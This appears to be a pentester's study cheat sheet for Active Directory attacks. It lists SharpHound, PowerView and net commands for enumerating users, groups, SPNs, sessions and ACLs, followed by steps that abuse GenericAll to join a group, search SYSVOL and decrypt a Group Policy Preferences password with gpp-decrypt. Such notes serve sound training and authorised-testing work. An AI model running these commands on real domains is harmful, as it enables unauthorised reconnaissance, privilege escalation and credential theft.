# ENUM
#bloodhound
```
run sharphound.ps1 or .exe on systems you can
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\[user]\Desktop\ -OutputPrefix "domain audit"
```

#users_and_groups
```powershell
net user /domain
net group /domain

net group [group] /domain #shows group members

Get-NetSession -ComputerName [hostname] # check for logged in users
# ENUM

.\PsLoggedon.exe \\[hostname] #check for logged on users
```

#LDAP 
```
# format
LDAP://HostName[:PortNumber][/DistinguishedName]

# get PDC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

#troubleshoot
```
# check query level NetSessionEnum
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

#SPNs 
```
setspn -L iis_service
setspn -T pentestlab -Q */*

# DEPENDS ON POWERVIEW IMPORT MODULE

Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

#powerview
```
powershell -ep bypass

Import-Module .\PowerView.ps1
Get-NetDomain

Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

#operating_systems
```
# DEPENDS ON POWERVIEW IMPORT MODULE

Get-NetComputer
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

#enum_permissions 
```
# DEPENDS ON POWERVIEW IMPORT MODULE

Find-LocalAdminAccess # search for hosts current user has local admin on
```

#Object_permissions
```
interesting permissions

GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group

# DEPENDS ON POWERVIEW IMPORT MODULE
Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Convert-NameToSid

we are interested in the ActiveDirectoryRights and SecurityIdentifier for each object we enumerate

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Get-ObjectAcl | ? {$_.SecurityIdentifier -eq "[pwned SID]"}

Convert-SidToName [output]
```

#abuse_object_permissions
```
generic all
net group "Management Department" stephanie /add /domain
```

#Domain_shares
```
# DEPENDS ON POWERVIEW IMPORT MODULE
Find-DomainShare

SYSVOL - every user has access by default
ls \\dc1.corp.com\sysvol\corp.com\ #change "corp.com" to domain and "dc1..." to DC

# ls directories
ls \\dc1.corp.com\sysvol\corp.com\Policies\

# cat interesting files
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

#GPP_passwords
```
passwords in group policy preferences can be decrypted with the leaked AES-256 key
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```